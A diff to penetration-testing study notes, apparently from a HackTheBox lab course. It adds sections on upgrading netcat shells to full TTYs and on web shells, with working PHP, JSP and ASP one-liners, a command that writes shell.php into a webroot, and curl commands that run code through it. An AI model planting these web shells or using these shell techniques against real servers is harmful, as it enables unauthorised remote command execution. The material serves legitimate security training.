@@ -166,8 +166,136 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.So
 
 ***
 
-#### In simple words:
+## **Upgrading TTY**
 
-**Reverse Shell:** A reverse shell is when the target machine connects back to the attacker and gives them a shell.
+Once we connect to a shell through Netcat, we will notice that we can only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.
 
-**Bind Shell:** A bind shell is when the target machine opens a port and waits for the attacker to connect.
+There are multiple methods to do this. For our purposes, we will use the `python/stty` method. In our `netcat` shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:
+
+```python
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:
+
+```bash
+www-data@remotehost$ ^Z
+
+SubhaDip03@htb[/htb]$ stty raw -echo
+SubhaDip03@htb[/htb]$ fg
+
+[Enter]
+[Enter]
+www-data@remotehost$
+```
+
+Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset` and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.
+
+We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:
+
+Types of Shells
+
+```bash
+SubhaDip03@htb[/htb]$ echo $TERM
+
+xterm-256color
+```
+
+Types of Shells
+
+```bash
+SubhaDip03@htb[/htb]$ stty size
+
+67 318
+```
+
+The first command showed us the `TERM` variable, and the second shows us the values for `rows` and `columns`, respectively. Now that we have our variables, we can go back to our `netcat` shell and use the following command to correct them:
+
+Types of Shells
+
+```bash
+www-data@remotehost$ export TERM=xterm-256color
+
+www-data@remotehost$ stty rows 67 columns 318
+```
+
+Once we do that, we should have a `netcat` shell that uses the terminal's full features, just like an SSH connection.
+
+### Netcat Shell Stabilization:
+
+```bash
+sudo nc -lnvp <PORT>
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export  TERM=xterm
+## Press CTRL+Z to background the process.
+stty raw -echo; fg
+```
+
+> **Note:** If the shell is loss or dies, any input in your own (local) terminal will not be visible (as a result of having disable terminal echo). To fix this type `reset` and press Enter.
+
+Another useful technique **(It is useful for getting reverse shell from Windows):**
+
+```bash
+sudo apt install rlwrap
+rlwrap nc -lnvp <PORT>
+## Press CTRL+Z to background the process.
+stty raw -echo; fg
+```
+
+***
+
+## Web Shell
+
+The final type of shell we have is a `Web Shell`. A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page.
+
+**Writing a Web Shell**
+
+First of all, we need to write our web shell that would take our command through a `GET` request, execute it, and print its output back. A web shell script is typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web languages:
+
+PHP Web Shell:
+
+```php
+<?php system($_REQUEST["cmd"]); ?>
+```
+
+JSP Web Shell:
+
+```
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+
+ASP Web Shell:
+
+```
+<% eval request("cmd") %>
+```
+
+After creating a web shell then upload the file or payload into target web root directory by file upload feature.
+
+The following are the default webroots for common web servers:
+
+| Web Server | Default Webroot        |
+| ---------- | ---------------------- |
+| `Apache`   | /var/www/html/         |
+| `Nginx`    | /usr/local/nginx/html/ |
+| `IIS`      | c:\inetpub\wwwroot\\   |
+| `XAMPP`    | C:\xampp\htdocs\\      |
+
+If we have remote access we can upload the shell by following:
+
+```bash
+echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+```
+
+**Accessing Web Shell**
+
+Once we write our web shell, we can either access it through a browser or by using `cURL`. We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Another option is to use `cURL`:
+
+```bash
+SubhaDip03@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
